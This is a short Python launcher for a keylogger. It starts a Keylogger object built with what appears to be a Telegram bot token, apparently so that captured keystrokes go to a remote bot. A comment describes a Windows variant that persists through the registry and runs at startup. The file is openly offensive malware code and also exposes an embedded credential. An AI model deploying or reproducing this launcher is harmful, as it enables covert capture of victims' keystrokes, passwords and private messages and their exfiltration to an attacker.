#!/usr/bin/python
import keylogger
import asyncio
# OR if you are packaging on Windows and want to add to registry
# So that the program runs on startup, uncomment the following import and comment the top one

#import keylogger_persistance_windows


#Main programx
my_keylogger = keylogger.Keylogger(5,"6541175839:AAEdVSOXC5uGSr8CnnWHMnv_JhswKbbW5JY")
asyncio.run(my_keylogger.start())
